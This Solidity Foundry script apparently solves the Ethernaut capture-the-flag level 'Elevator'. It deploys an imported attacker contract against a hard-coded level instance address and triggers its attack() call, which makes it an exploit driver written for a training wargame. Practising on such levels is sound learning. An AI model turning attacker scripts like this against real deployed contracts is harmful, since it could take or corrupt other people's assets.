// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/11-Elevator.sol";
import "../levels/11-Elevator.sol";
import "forge-std/Script.sol";

contract Attack is Script {

    function run() external{
        vm.startBroadcast();

        // Create ElevatorAttacker instance
        ElevatorAttacker elevatorAttacker = new ElevatorAttacker(0xEB6293991D02306872cf87CC3fa0DFb2a5424bb0);

        // Call attack() on ElevatorAttacker
        elevatorAttacker.attack();

        vm.stopBroadcast();
    }
}